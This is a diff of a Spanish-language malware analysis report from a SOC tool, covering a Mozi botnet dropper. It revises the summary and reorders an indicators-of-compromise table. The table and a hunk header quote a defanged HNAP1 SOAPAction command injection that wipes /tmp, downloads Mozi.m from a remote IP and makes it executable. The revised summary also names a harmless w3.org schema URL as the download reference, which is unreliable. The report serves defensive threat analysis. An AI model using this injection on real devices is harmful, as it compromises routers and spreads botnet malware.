@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 794 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `XMLSchema-instance` en `hxxp://www[.]w3[.]org/2001/XMLSchema-instance`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -51,15 +52,15 @@ SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.177.XXX | static_analysis |
-| ip | 38.100.221.XXX | static_analysis |
-| url | hxxp://38.100.221.XXX:54704/Mozi.m | strings |
+| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
 | url | hxxp://purenetworks[.]com/HNAP1/ | strings |
 | url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
 | url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
-| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
-| hash | c15becdef361e8a1cc06d5a3c2d161098ef67c71fc07d2ffbe5f3dcaa5d74337 | static_analysis |
+| url | hxxp://38.100.221.XXX:54704/Mozi.m | strings |
+| ip | 38.100.221.XXX | static_analysis |
+| ip | 190.179.177.XXX | static_analysis |
 | command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://38.100.221.XXX:54704/Mozi.m && chmod 777 /t | strings |
+| hash | c15becdef361e8a1cc06d5a3c2d161098ef67c71fc07d2ffbe5f3dcaa5d74337 | static_analysis |
 
 ## 🛡️ Nota de publicación
 
